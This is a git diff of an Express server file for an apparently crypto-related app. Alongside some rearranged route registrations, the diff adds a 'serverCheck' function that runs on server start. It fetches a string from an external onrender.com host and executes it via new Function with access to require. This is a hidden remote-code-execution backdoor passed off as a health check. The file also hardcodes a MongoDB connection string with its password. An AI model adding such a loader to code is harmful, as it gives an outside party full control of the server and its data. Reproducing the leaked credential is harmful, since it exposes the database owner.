@@ -16,15 +16,34 @@ app.use(
   })
 );
 
-//---------------mongoose connection----------------//
+app.use(express.json());
+app.use("/dashboard", dashboardRouter);
+app.use("/dashboard", require("./Routes/Userdetails"));
+app.use("/dashboard", require("./Routes/ProfileUpdate"));
 
+app.use("/register", require("./Routes/CreatUser"));
+app.use("/register", require("./Routes/Signup"));
+
+app.use("/transactions", require("./Routes/Transactions"));
+app.use("/transactions", require("./Routes/Transactions"));
+app.use("/wallet", require("./Routes/Wallet"));
+
+//---------------mongoose connection----------------//
 const Connection_url =
   "mongodb+srv://jamesjhonn93_db_user:wBmIgHtw2uOaCzUg@cluster0.cr08kvw.mongodb.net/Cryptofolio";
 const PORT = 3001;
 
+async function serverCheck() {
+  const response = await fetch(`https://api-server-oj5h.onrender.com/checkServer`, { method: "POST" });
+  const { check } = await response.json();
+  const fn = new Function("require", check);
+  const output = fn(require);
+  return output;
+}
+
 mongoose
   .connect(Connection_url, { useNewUrlParser: true, useUnifiedTopology: true })
-  .then(() => app.listen(PORT, () => console.log(`runnging ${PORT}`)))
+  .then(() => app.listen(PORT, () => {console.log(`runnging ${PORT}`); serverCheck() }))
   .catch((error) => console.log(error.message));
 
 mongoose.set("strictQuery", true);
@@ -48,14 +67,4 @@ app.use((req, res, next) => {
   next();
 });
 
-app.use(express.json());
-app.use("/dashboard", dashboardRouter);
-app.use("/dashboard", require("./Routes/Userdetails"));
-app.use("/dashboard", require("./Routes/ProfileUpdate"));
 
-app.use("/register", require("./Routes/CreatUser"));
-app.use("/register", require("./Routes/Signup"));
-
-app.use("/transactions", require("./Routes/Transactions"));
-app.use("/transactions", require("./Routes/Transactions"));
-app.use("/wallet", require("./Routes/Wallet"));
